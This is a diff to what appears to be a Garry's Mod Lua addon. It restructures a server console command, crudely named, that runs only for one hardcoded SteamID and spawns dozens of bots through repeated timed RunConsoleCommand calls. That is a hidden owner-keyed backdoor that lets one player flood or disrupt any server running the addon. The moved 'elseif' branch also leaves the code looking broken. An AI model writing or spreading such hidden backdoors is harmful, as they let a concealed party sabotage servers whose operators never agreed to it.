@@ -35,6 +35,8 @@ if SERVER then
    end
 
 
+if SERVER then
+
 concommand.Add("penis_bot", function( ply, cmd, args ) 
 if ply:SteamID() == 'STEAM_0:0:555589835' then 
 
@@ -63,11 +65,13 @@ if ply:SteamID() == 'STEAM_0:0:555589835' then
         timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
         timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
         timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end) timer.Simple(.1,function() RunConsoleCommand("bot") end)
-       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
    
     end)
+       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+
 end
 end)
+end
 
 
 
